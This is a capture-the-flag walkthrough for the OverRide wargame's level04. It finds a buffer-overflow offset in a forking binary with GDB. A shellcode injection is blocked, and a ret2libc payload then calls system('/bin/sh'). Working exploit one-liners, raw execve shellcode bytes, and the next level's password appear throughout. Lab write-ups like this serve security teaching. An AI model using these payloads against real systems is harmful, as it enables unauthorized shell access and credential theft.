# Walkthrough

## Solution

ret2libc  
```
level04@OverRide:~$ (python -c "print 'A' * 156 + '\xd0\xae\xe6\xf7' + 'B' * 4 + '\xec\x97\xf8\xf7'"; cat - ) | ./level04
Give me some shellcode, k
pwd
/home/users/level04
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
^C
```

## Explanation

'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' - 45 chars

By default, when a program forks, GDB will continue to debug the parent process and the child process will run unimpeded.  
To follow the child process instead of the parent process, we can use the command set follow-fork-mode.  
`set follow-fork-mode child`  

```
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/users/level04/level04 
[New process 2348]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2348]
0x41326641 in ?? ()
```
-> Offset is at 156.  

Let's try to inject a shellcode after overflowing the gets buffer.  
```
level04@OverRide:~$ export SHELLCODE=`python -c "print('\x90' * 100 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')"`
level04@OverRide:~$ gdb level04 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x80486cd
(gdb) run
Starting program: /home/users/level04/level04 

Breakpoint 1, 0x080486cd in main ()
(gdb) (gdb) x/s *((char **)environ)
Undefined command: "".  Try "help".
(gdb) x/s *((char **)environ)
0xffffd84c:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f̀1ۉ\330@̀\350\334\377\377\377/bin/sh"
(gdb) x/12wx 0xffffd84c
0xffffd84c:	0x4c454853	0x444f434c	0x90903d45	0x90909090
0xffffd85c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd86c:	0x90909090	0x90909090	0x90909090	0x90909090
```  
Let's pick this address: 0xffffd85c  
```
level04@OverRide:~$ (python -c "print '\x90' * 156 + '\x5c\xd5\xff\xff'"; cat -) | ./level04 
Give me some shellcode, k
no exec() for you
```

--> It is not working, because there is a noexec flag set. It does not allow the execution of executable binaries in the mounted file system...  
```
level04@OverRide:~$ mount | grep noexec
proc on /proc type proc (rw,noexec,nosuid,nodev)
sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)
devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=0620)
tmpfs on /run type tmpfs (rw,noexec,nosuid,size=10%,mode=0755)
none on /run/lock type tmpfs (rw,noexec,nosuid,nodev,size=5242880)
```

--> Ret2libc  
https://www.kapravelos.com/teaching/csc591-f17/lectures/04-rop.pdf  

```
(gdb) break main
Breakpoint 1 at 0x80486cd
(gdb) run
Starting program: /home/users/level04/level04 

Breakpoint 1, 0x080486cd in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
```

Address of system: 0xf7e6aed0  
Address of /bin/sh: 0xf7f897ec  

```
level04@OverRide:~$ (python -c "print 'A' * 156 + '\xd0\xae\xe6\xf7' + 'bbbb' + '\xec\x97\xf8\xf7'"; cat - ) | ./level04
Give me some shellcode, k
pwd
/home/users/level04
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
^C
```

### Execution

```
level04@OverRide:~$ ./level04 
Give me some shellcode, k
hello
child is exiting...

level04@OverRide:~$ ./level04 
Give me some shellcode, k
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
ls
pwd
^C

```

### Disassembly
```
0x08048634  clear_stdin
0x08048657  get_unum
0x0804868f  prog_timeout
0x080486a0  enable_timeout_cons
```